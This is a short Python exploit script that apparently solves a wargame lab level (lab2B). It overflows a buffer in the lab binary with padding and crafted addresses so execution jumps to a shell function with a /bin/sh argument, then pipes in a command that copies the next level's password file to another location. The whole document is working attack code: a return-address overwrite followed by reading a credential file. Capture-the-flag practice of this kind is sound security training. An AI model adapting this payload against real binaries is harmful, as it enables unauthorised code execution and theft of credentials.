#!/urs/bin/python
#coding: utf-8

import os
import struct

crafted = "A"*0x1b + struct.pack('<I',0x080486bd) # Padding + Shell() address
crafted += "A"*4 + struct.pack('<I',0x80487d0) # Padding + /bin/sh pointer

cmd = '$(python -c \'print "%s"\')' % crafted
os.system('echo "cat /home/lab2A/.pass > /usr/slove/lab2A.pass" | ' + '/levels/lab02/lab2B %s' %cmd)
print '[+] pass stored in /usr/slove/lab2A.pass'